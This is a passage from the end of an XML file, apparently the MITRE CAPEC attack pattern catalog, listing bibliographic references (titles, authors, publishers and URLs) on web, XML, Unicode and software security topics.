         <URL>http://www.ietf.org/rfc/rfc1738.txt</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-498">
         <Title>HTML URL Encoding Reference</Title>
         <Publication>W3Schools.com</Publication>
         <Publisher>Refsnes Data</Publisher>
         <URL>http://www.w3schools.com/tags/ref_urlencode.asp</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-499">
         <Title>The URLEncode and URLDecode Page</Title>
         <Publisher>Albion Research Ltd</Publisher>
         <URL>http://www.albionresearch.com/misc/urlencode.php</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-50">
         <Title>Wikipedia</Title>
         <Publisher>The Wikimedia Foundation, Inc</Publisher>
         <URL>http://en.wikipedia.org/wiki/Reverse_engineering</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-500">
         <Author>David Wheeler</Author>
         <Title>Secure Programming for Linux and Unix HOWTO</Title>
         <URL>http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/filter-html.html#VALIDATING-URIS</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-501">
         <Author>Stewart A.</Author>
         <Title>DLL SIDE-LOADING: A Thorn in the Side of the Anti-Virus Industry</Title>
         <Publisher>FireEye</Publisher>
         <URL>https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-503">
         <Author>scut</Author>
         <Author>team teso</Author>
         <Title>Exploiting Format String Vulnerabilities</Title>
         <URL>http://doc.bughunter.net/format-string/exploit-fs.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-504">
         <Author>Halvar Flake</Author>
         <Title>Auditing binaries for security vulnerabilities</Title>
         <URL>http://www.blackhat.com/presentations/bh-europe-00/HalvarFlake/HalvarFlake.ppt</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-505">
         <Title>Fortify Taxonomy of Vulnerabilities</Title>
         <Publisher>Fortify Software</Publisher>
         <URL>https://vulncat.hpefod.com/en</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-506">
         <Title>Syslog man page</Title>
         <URL>http://www.rt.com/man/syslog.3.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-51">
         <Title>Wikipedia</Title>
         <Publisher>The Wikimedia Foundation, Inc</Publisher>
         <URL>http://en.wikipedia.org/wiki/Decompiler</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-52">
         <Title>Wikipedia</Title>
         <Publisher>The Wikimedia Foundation, Inc</Publisher>
         <URL>http://en.wikipedia.org/wiki/Debugger</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-520">
         <Author>Artur Maj</Author>
         <Title>Securing PHP: Step-by-Step</Title>
         <Publication_Year>2003</Publication_Year>
         <Publication_Month>--06</Publication_Month>
         <Publication_Day>---22</Publication_Day>
         <Publisher>Security Focus</Publisher>
         <URL>http://www.securityfocus.com/infocus/1706</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-521">
         <Author>Clancy Malcolm</Author>
         <Title>Ten Security Checks for PHP, Part 1</Title>
         <Publication_Year>2003</Publication_Year>
         <Publication_Month>--03</Publication_Month>
         <Publication_Day>---20</Publication_Day>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-522">
         <Title>PHP Manual</Title>
         <Publisher>The PHP Group</Publisher>
         <URL>http://www.php.net/manual/en/security.globals.php</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-525">
         <Author>Markus Kuhn</Author>
         <Title>UTF-8 and Unicode FAQ for Unix/Linux</Title>
         <Publication_Year>1999</Publication_Year>
         <Publication_Month>--06</Publication_Month>
         <Publication_Day>---04</Publication_Day>
         <URL>http://www.cl.cam.ac.uk/~mgk25/unicode.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-53">
         <Title>Wikipedia</Title>
         <Publisher>The Wikimedia Foundation, Inc</Publisher>
         <URL>http://en.wikipedia.org/wiki/Disassembler</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-530">
         <Author>Michael Howard</Author>
         <Author>David LeBlanc</Author>
         <Title>Writing Secure Code</Title>
         <Publisher>Microsoft Press</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-531">
         <Author>Bruce Schneier</Author>
         <Title>Security Risks of Unicode</Title>
         <Publication>Crypto-Gram Newsletter</Publication>
         <Publication_Year>2000</Publication_Year>
         <Publication_Month>--07</Publication_Month>
         <Publication_Day>---15</Publication_Day>
         <URL>https://www.schneier.com/crypto-gram/archives/2000/0715.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-532">
         <Title>Wikipedia</Title>
         <Publisher>The Wikimedia Foundation, Inc</Publisher>
         <URL>http://en.wikipedia.org/wiki/UTF-8</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-533">
         <Author>F. Yergeau</Author>
         <Title>RFC 3629 - UTF-8, a transformation format of ISO 10646</Title>
         <Publication_Year>2003</Publication_Year>
         <Publication_Month>--11</Publication_Month>
         <URL>http://www.faqs.org/rfcs/rfc3629.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-535">
         <Title>Corrigendum #1: UTF-8 Shortest Form</Title>
         <Publication>The Unicode Standard</Publication>
         <Publication_Year>2001</Publication_Year>
         <Publication_Month>--03</Publication_Month>
         <Publisher>Unicode, Inc.</Publisher>
         <URL>http://www.unicode.org/versions/corrigendum1.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-537">
         <Author>Markus Kuhn</Author>
         <Title>UTF-8 decoder capability and stress test</Title>
         <Publication_Year>2003</Publication_Year>
         <Publication_Month>--02</Publication_Month>
         <Publication_Day>---19</Publication_Day>
         <URL>http://www.cl.cam.ac.uk/%7Emgk25/ucs/examples/UTF-8-test.txt</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-539">
         <Author>Shreeraj Shah</Author>
         <Title>Ajax fingerprinting for Web 2.0 Applications</Title>
         <Publication>Help Net Security</Publication>
         <URL>https://www.helpnetsecurity.com/dl/articles/Ajax_fingerprinting.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-543">
         <Title>Secunia Advisory SA16869: Firefox Command Line URL Shell Command Injection</Title>
         <Publication>Secunia Advisories</Publication>
         <Publication_Year>2005</Publication_Year>
         <Publication_Month>--09</Publication_Month>
         <Publication_Day>---20</Publication_Day>
         <Publisher>Secunia</Publisher>
         <URL>http://secunia.com/advisories/16869/</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-546">
         <Title>The OWASP Application Security Desk Reference</Title>
         <Publication_Year>2009</Publication_Year>
         <Publisher>The Open Web Application Security Project (OWASP)</Publisher>
         <URL>http://www.owasp.org/index.php/Integer_overflow</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-547">
         <Author>Robert C. Seacord</Author>
         <Title>SAMATE - Software Assurance Metrics And Tool Evaluation</Title>
         <Publication_Year>2006</Publication_Year>
         <Publication_Month>--05</Publication_Month>
         <Publication_Day>---22</Publication_Day>
         <Publisher>National Institute of Standards and Technology (NIST)</Publisher>
         <URL>http://samate.nist.gov/SRD/view_testcase.php?tID=1511</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-548">
         <Author>Robert C. Seacord</Author>
         <Title>Secure Coding in C and C++</Title>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-550">
         <Author>A. Muffet</Author>
         <Title>The night the log was forged</Title>
         <URL>http://doc.novsu.ac.ru/oreilly/tcpip/puis/ch10_05.htm</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-551">
         <Title>The OWASP Application Security Desk Reference</Title>
         <Publication_Year>2009</Publication_Year>
         <Publisher>The Open Web Application Security Project (OWASP)</Publisher>
         <URL>https://www.owasp.org/index.php/Log_Injection</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-552">
         <Author>Fortify Software</Author>
         <Title>SAMATE - Software Assurance Metrics And Tool Evaluation</Title>
         <Publication_Year>2006</Publication_Year>
         <Publication_Month>--06</Publication_Month>
         <Publication_Day>---22</Publication_Day>
         <Publisher>National Institute of Standards and Technology (NIST)</Publisher>
         <URL>https://samate.nist.gov/SRD/view_testcase.php?tID=1579</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-553">
         <Author>M. Bishop</Author>
         <Title>Computer Security: Art and Science</Title>
         <Publication_Year>2003</Publication_Year>
         <Publisher>Addison-Wesley</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-554">
         <Author>Walid Negm</Author>
         <Title>Anatomy of a Web Services Attack</Title>
         <Publication_Year>2004</Publication_Year>
         <Publication_Month>--03</Publication_Month>
         <Publication_Day>---01</Publication_Day>
         <Publisher>ForumSystems</Publisher>
         <URL>https://www.forumsys.com/wp-content/uploads/2014/01/Anatomy-of-a-Web-Services-Attack.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-555">
         <Author>Frank Coyle</Author>
         <Title>Seven Steps to XML Mastery</Title>
         <Publication_Year>2006</Publication_Year>
         <Publication_Month>--08</Publication_Month>
         <Publication_Day>---25</Publication_Day>
         <URL>http://www.informit.com/articles/article.aspx?p=601349</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-556">
         <Title>Wikipedia</Title>
         <Publisher>The Wikimedia Foundation, Inc</Publisher>
         <URL>http://en.wikipedia.org/wiki/Cryptanalysis</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-559">
         <Author>Jeff Warren</Author>
         <Title>Extracting Service Account Passwords with Kerberoasting</Title>
         <Publication_Year>2017</Publication_Year>
         <Publication_Month>--05</Publication_Month>
         <Publication_Day>---09</Publication_Day>
         <URL>https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-560">
         <Title>Elaborate Ways to Exploit XSS: Flash Parameter Injection (FPI)</Title>
         <Publication_Year>2014</Publication_Year>
         <Publication_Month>--04</Publication_Month>
         <Publication_Day>---08</Publication_Day>
         <Publisher>Acunetix</Publisher>
         <URL>https://www.acunetix.com/blog/articles/elaborate-ways-exploit-xss-flash-parameter-injection/</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-561">
         <Title>Cross-Site Flashing</Title>
         <Publisher>Trustwave</Publisher>
         <URL>http://doc.cenzic.com/sadoc9x14ba847/CPL0001509.htm</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-57">
         <Title>Wikipedia</Title>
         <Publisher>The Wikimedia Foundation, Inc</Publisher>
         <URL>http://en.wikipedia.org/wiki/Proprietary_protocol</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-59">
         <Title>WASC Threat Classification 2.0</Title>
         <Publication_Year>2010</Publication_Year>
         <Publisher>The Web Application Security Consortium (WASC)</Publisher>
         <URL>http://projects.webappsec.org/Remote-File-Inclusion</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-6">
         <Title>Orion Application Server JSP Source Disclosure Vulnerability (Bugtraq ID: 17204)</Title>
         <Publisher>SecurityFocus</Publisher>
         <URL>http://www.securityfocus.com/bid/17204/info</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-60">
         <Author>Shaun Clowes</Author>
         <Title>A Study In Scarlet, Exploiting Common Vulnerabilities in PHP Applications</Title>
         <Publisher>Blackhat Briefings Asia 2001</Publisher>
         <URL>http://securereality.com.au/studyinscarlett/</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-62">
         <Author>Thomas Schreiber</Author>
         <Title>Session Riding: A Widespread Vulnerability in Today's Web Applications</Title>
         <Publisher>SecureNet GmbH</Publisher>
         <URL>https://crypto.stanford.edu/cs155old/cs155-spring08/papers/Session_Riding.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-63">
         <Title>OWASP Testing Guide</Title>
         <Edition>v4 [DRAFT]</Edition>
         <Publisher>The Open Web Application Security Project (OWASP)</Publisher>
         <URL>http://www.owasp.org/index.php/Testing_for_Session_Management</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-64">
         <Author>Amit Klein</Author>
         <Title>Multiple vendors XML parser (and SOAP/WebServices server) Denial of Service attack using DTD</Title>
         <URL>http://www.securityfocus.com/archive/1/303509</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-65">
         <Author>Pete Lindstrom</Author>
         <Title>Attacking &amp; Defending Web Services</Title>
         <Publication_Year>2002</Publication_Year>
         <Publisher>SPiRE Security</Publisher>
         <URL>http://www.webtorials.com/main/comnet/cn2003/web-service/24.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-66">
         <Author>Elliotte Rusty Harold</Author>
         <Title>Tip: Configure SAX parsers for secure processing</Title>
         <Publication>IBM developerWorks</Publication>
         <Publication_Year>2005</Publication_Year>
         <Publication_Month>--05</Publication_Month>
         <Publication_Day>---27</Publication_Day>
         <Publisher>IBM</Publisher>
         <URL>http://www.ibm.com/developerworks/xml/library/x-tipcfsx.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-67">
         <Author>Bryan Sullivan</Author>
         <Title>XML Denial of Service Attacks and Defenses</Title>
         <URL>http://msdn.microsoft.com/en-us/magazine/ee335713.aspx</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-69">
         <Title>OWASP Cheatsheets</Title>
         <Publisher>The Open Web Application Security Project (OWASP)</Publisher>
         <URL>https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-70">
         <Title>OWASP Testing Guide</Title>
         <Edition>v2</Edition>
         <Publisher>The Open Web Application Security Project (OWASP)</Publisher>
         <URL>http://www.owasp.org/index.php/Testing_for_Cross_site_scripting</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-71">
         <Title>Non-alphanumeric XSS cheat sheet</Title>
         <URL>http://sla.ckers.org/forum/read.php?24,28687</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-72">
         <Title>WASC Threat Classification 2.0</Title>
         <Publication_Year>2010</Publication_Year>
         <Publisher>The Web Application Security Consortium (WASC)</Publisher>
         <URL>http://projects.webappsec.org/Cross-Site+Scripting</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-73">
         <Title>XXE (Xml eXternal Entity) Attack</Title>
         <Publisher>Beyond Security</Publisher>
         <URL>http://www.securiteam.com/securitynews/6D0100A5PU.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-74">
         <Title>CESA-2007-002 - rev 2: Sun JDK6 breaks XXE attack protection</Title>
         <URL>http://scary.beasts.org/security/CESA-2007-002.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-75">
         <Title>Wikipedia</Title>
         <Publisher>The Wikimedia Foundation, Inc</Publisher>
         <URL>http://en.wikipedia.org/wiki/Greasemonkey</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-76">
         <Title>Firebug</Title>
         <URL>http://getfirebug.com/</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-77">
         <Title>Mozilla Firefox Add-ons</Title>
         <URL>https://addons.mozilla.org/en-US/firefox/addon/greasemonkey/</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-78">
         <Title>OWASP Testing Guide</Title>
         <Edition>v4 [DRAFT]</Edition>
         <Publisher>The Open Web Application Security Project (OWASP)</Publisher>
         <URL>http://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OWASP-DV-002)</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-8">
         <Title>The OWASP Application Security Desk Reference</Title>
         <Publication_Year>2009</Publication_Year>
         <Publisher>The Open Web Application Security Project (OWASP)</Publisher>
         <URL>https://www.owasp.org/index.php/Path_Traversal</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-80">
         <Title>WASC Threat Classification 2.0</Title>
         <Publication_Year>2010</Publication_Year>
         <Publisher>The Web Application Security Consortium (WASC)</Publisher>
         <URL>http://projects.webappsec.org/w/page/13246956/Routing-Detour</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-81">
         <Author>Andre Yee</Author>
         <Title>Threat Protection in a Service Oriented World</Title>
         <Publication>NFR Security</Publication>
         <URL>http://www.unatekconference.com/images/pdfs/presentations/Yee.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-84">
         <Author>Michal Zalewski</Author>
         <Title>Browser Security Handbook</Title>
         <Publication_Year>2008</Publication_Year>
         <Publisher>Google Inc.</Publisher>
         <URL>https://code.google.com/archive/p/browsersec/wikis/Main.wiki</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-85">
         <Author>M. Mahemoff</Author>
         <Title>Explaining the "Don't Click" Clickjacking Tweetbomb</Title>
         <Publication_Year>2009</Publication_Year>
         <Publication_Month>--02</Publication_Month>
         <Publication_Day>---12</Publication_Day>
         <Publisher>Software As She's Developed</Publisher>
         <URL>http://softwareas.com/explaining-the-dont-click-clickjacking-tweetbomb</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-86">
         <Author>Ryan Naraine</Author>
         <Title>DoS Flaw in SOAP DTD Parameter</Title>
         <Publication>InternetNews.com</Publication>
         <Publication_Year>2003</Publication_Year>
         <Publication_Month>--12</Publication_Month>
         <Publication_Day>---15</Publication_Day>
         <Publisher>ITBusiness Edge, Quinstreet Inc.</Publisher>
         <URL>http://www.internetnews.com/dev-news/article.php/3289191</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-88">
         <Title>The OWASP Guide Project</Title>
         <Publisher>The Open Web Application Security Project (OWASP)</Publisher>
         <URL>http://www.owasp.org/index.php/File_System</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-89">
         <Author>Shlomo, Yona</Author>
         <Title>XML Parser Attacks: A summary of ways to attack an XML Parser</Title>
         <Publication_Year>2007</Publication_Year>
         <URL>http://yeda.cs.technion.ac.il/~yona/talks/xml_parser_attacks/slides/slide2.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-9">
         <Title>OWASP Testing Guide</Title>
         <Edition>v3</Edition>
         <Publication_Year>2010</Publication_Year>
         <Publisher>The Open Web Application Security Project (OWASP)</Publisher>
         <URL>https://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001)</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-91">
         <Author>J. Cappos</Author>
         <Author>J. Rasley</Author>
         <Author>J. Samuel</Author>
         <Author>I. Beschastnikh</Author>
         <Author>C. Barsan</Author>
         <Author>A. Krishnamurthy</Author>
         <Author>T. Anderson</Author>
         <Title>Retaining Sandbox Containment Despite Bugs in Privileged Memory-Safe Code</Title>
         <Publication>The 17th ACM Conference on Computer and Communications Security (CCS '10)</Publication>
         <Publication_Year>2010</Publication_Year>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-92">
         <Title>Malware Protection Center: Threat Research and Response</Title>
         <Publication_Year>2007</Publication_Year>
         <Publisher>Microsoft Corporation</Publisher>
         <URL>https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Exploit%3AJava%2FByteVerify.C</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-94">
         <Author>Jeremiah Grossman</Author>
         <Title>Attribute-Based Cross-Site Scripting</Title>
         <URL>http://jeremiahgrossman.blogspot.com/2007/07/attribute-based-cross-site-scripting.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-96">
         <Title>Google Cross-Site Scripting HOWTO article</Title>
         <Publisher>Google</Publisher>
         <URL>https://code.google.com/archive/p/doctype/wikis/ArticleXSSInUrlAttributes.wiki</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-97">
         <Title>OWASP Cheatsheets</Title>
         <Publisher>The Open Web Application Security Project (OWASP)</Publisher>
         <URL>http://ha.ckers.org/xss.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-99">
         <Author>Matteo Carli</Author>
         <Title>XSS and CSRF vulnerability on Cpanel</Title>
         <Publication>Symantec Connect</Publication>
         <Publication_Year>2008</Publication_Year>
         <Publication_Month>--05</Publication_Month>
         <Publication_Day>---09</Publication_Day>
         <Publisher>SecurityFocus</Publisher>
         <URL>http://www.securityfocus.com/archive/1/archive/1/491864/100/0/threaded</URL>
      </External_Reference>
   </External_References>
</Attack_Pattern_Catalog>
